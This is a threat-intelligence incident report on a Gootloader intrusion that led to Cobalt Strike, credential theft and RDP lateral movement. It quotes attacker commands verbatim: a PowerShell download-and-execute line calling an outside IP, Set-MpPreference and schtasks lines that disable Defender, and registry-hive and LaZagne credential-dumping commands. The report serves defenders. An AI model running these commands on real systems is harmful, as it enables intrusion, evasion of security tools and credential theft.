# Case summary
The intrusion started with a user searching Bing for “Olymplus Plea Agreement?”. The user then clicked on the second search result which led to the download and execution of a malicious javascript file (see video in Initial Access section). Upon execution, Gootloader utilized encoded PowerShell scripts to load Cobalt Strike into memory and persist on the host using a combination of registry keys and scheduled tasks.

Fifteen minutes after the initial execution, we observed the threat actors using the PowerShell implementation of SharpHound (BloodHound) to discover attack paths in the Active Directory-based network. The threat actors collected the results and pivoted to another host via a Cobalt Strike PowerShell beacon.

After pivoting, they disabled Windows Defender, before executing a second Cobalt Strike payload for a different command and control server. Around an hour after the initial infection, the threat actors ran LaZagne to retrieve all saved credentials from the pivoted workstation. Meanwhile on the beachhead host, the threat actors ran Mimikatz via PowerShell to extract credentials.

With those credentials, the threat actors used RDP from the beachhead host to the already compromised workstation host. They then targeted several other workstations with Cobalt Strike beacon executables; however, no further activity was observed on those endpoints other than the initial lateral movement.

The threat actors favored RDP and remote WMI as their preferred methods to interact with the hosts and servers of interest throughout the rest of the intrusion. After around a four-hour pause of inactivity, the threat actors enabled restricted admin mode via WMI on a domain controller and logged in using RDP.

The threat actors then used Lazagne again on the domain controller to extract more credentials. Our evidence shows that the attackers then began looking for interesting documents on file shares. They opened the documents one-by-one on the remote host via RDP. They directed their focus to documents with legal and insurance-related content.

On the second and final day of the intrusion, the threat actors ran Advanced IP Scanner from the domain controller via the RDP session. Additionally, they inspected the file server and backup server, looking for more interesting data before leaving the network.

# Analysis

The threat actor gained initial access using Gootloader malware. Here’s a video of the user searching and downloading the malware via the poisoned SEO search.


The Javascript file is then executed when double clicked after the zip is opened.
 

 
# Execution
Gootloader upon execution creates two registry keys:
- HKCU:\SOFTWARE\Microsoft\Phone\Username
- HKCU:\SOFTWARE\Microsoft\Phone\Username0

The first is populated with an encoded Cobalt Strike payload and the latter is used to store a .NET loader named powershell.dll.
 

 

 
Following the Registry events, a PowerShell command was launched executing an encoded command.
 

The PowerShell command will extract the .NET loader from HKCU:\SOFTWARE\Microsoft\Phone\Username0 and execute the code in memory via `Assembly.Load()`.

This CyberChef recipe can be used to decode the related PS encoded payload.
 
Once the PowerShell script is finished running, the next stage involves the .NET loader. The .NET loader will read HKCU:\SOFTWARE\Microsoft\Phone\Username and extract the encoded Cobalt Strike payload. This payload will be decoded and subsequently loaded into memory for execution.
 
A simple encoding scheme is used where a letter will correspond to one of the hex characters (0-F), or alternately three zeros.
 
The following shows the source code responsible for the core logic of the .NET loader.
 

The below diagram summarizes the Gootloader initial execution. 
 

An excellent resource from Microsoft describes a set of configurations that can be applied to Windows that can stop .js files from executing, preventing this attack chain from ever getting off the ground.
 
During later stages of the intrusion, Cobalt Strike was executed interactively through RDP on multiple systems.
 
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio'))"
 
# Persistence
The Javascript (Gootloader) file invoked an encoded PowerShell command.
 

 

The task created from the PowerShell script:
 

 
# Defense Evasion
Windows Defender scheduled scans were deleted from the system. This was observed on multiple servers the threat actor pivoted to.
- schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f
- schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f
- schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f
- schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f

Furthermore, PowerShell was used to disable multiple security features built into Microsoft Defender.
- Set-MpPreference -DisableRealtimeMonitoring $true
- Set-MpPreference -DisableArchiveScanning $true
- Set-MpPreference -DisableBehaviorMonitoring $true
- Set-MpPreference -DisableIOAVProtection $true
- Set-MpPreference -DisableIntrusionPreventionSystem $true
- Set-MpPreference -DisableScanningNetworkFiles $true
- Set-MpPreference -MAPSReporting 0
- Set-MpPreference -DisableCatchupFullScan $True
- Set-MpPreference -DisableCatchupQuickScan $True

As in many cases involving Cobalt Strike, we observed rundll32 used to load the Cobalt Strike beacons into memory on the beachhead host.
 

 
This can be observed in the memory dump from the beachhead host with the tell-tale PAGE_EXECUTE_READWRITE protection settings on the memory space and MZ headers observable in the process memory space.
 

 
During the intrusion we observed various named pipes utilized by the threat actor’s Cobalt Strike beacons including default Cobalt Strike named pipes.

The threat actors were observed making use of double encoded Powershell commands. The first layer of encoding contains Hexadecimal and XOR encoding.
 

The second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.
 

 
Decoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.
 

 
# Credential Access
The malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.
 

 
Another PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.
 
This CyberChef recipe can be used to decode the inner encoded command.
 
The output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.
 
 

 
In addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all” switch.
ls.exe all -oN -output C:\Users\REDACTED
This will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.
 

 
Here’s the commands from another system:
- cmd.exe /c "reg.exe save hklm\sam c:\users\REDACTED\appdata\local\temp\1\dznuxujzr"
- cmd.exe /c "reg.exe save hklm\system c:\users\REDACTED\appdata\local\temp\1\mkffdg"
- cmd.exe /c "reg.exe save hklm\security c:\users\REDACTED\appdata\local\temp\1\iszmqwmjemt"

# Discovery
The threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.

 
They also ran a WMI command on the beachhead host and one other host to check for AntiVirus.
 
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List

The threat actors executed this command remotely on a domain controller, before moving laterally to it:
powershell.exe ls C:\ > C:\file.txt
While having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.
 
On the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:

 

# Lateral Movement

As observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.
 

 
SMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.
 

 
These executables were then executed by a remote service visible in the windows event id 7045 logs.
 

 
Next to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.
 
Restricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.
 
The threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.

The logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.
 

 
# Collection
The threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.
 

 
Shellbags reveled attempts to enumerate multiple file shares containing information of interest to the threat actor.
 

 
# Command and Control
# Gootloader

Gootloader second stage download URLs. These URLs were deobfuscated and extracted using this script by HP Threat Research. They’ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.

# Impact
In this case, there was no further impact to the environment before the threat actors were evicted.
 
# MITRE ATT&CK DATASET
T1189 Drive-by Compromise
T1204.001 – User Execution: Malicious Link
T1204.002 – User Execution: Malicious File
T1059.001 – Command and Scripting Interpreter: PowerShell
T1053 – Scheduled Task/Job
T1218.011 – System Binary Proxy Execution: Rundll32
T1555 – Credentials from Password Stores
T1003.001- OS Credential Dumping: LSASS Memory
T1087 – Account Discovery
T1560 – Archive Collected Data
T1482 – Domain Trust Discovery
T1615 – Group Policy Discovery
T1069 – Permission Groups Discovery
T1018 – Remote System Discovery
T1033 – System Owner/User Discovery
T1021.001 – Remote Services: Remote Desktop Protocol
T1021.006 – Remote Services: Windows Remote Management
T1005 – Data from Local System
T1039 – Data from Network Shared Drive
T1046 – Network Service Scanning
T1562.001 – Impair Defenses: Disable or Modify Tools
T1518.001 – Security Software Discovery
T1071.001 Web Protocols
T1027 – Obfuscated Files or Information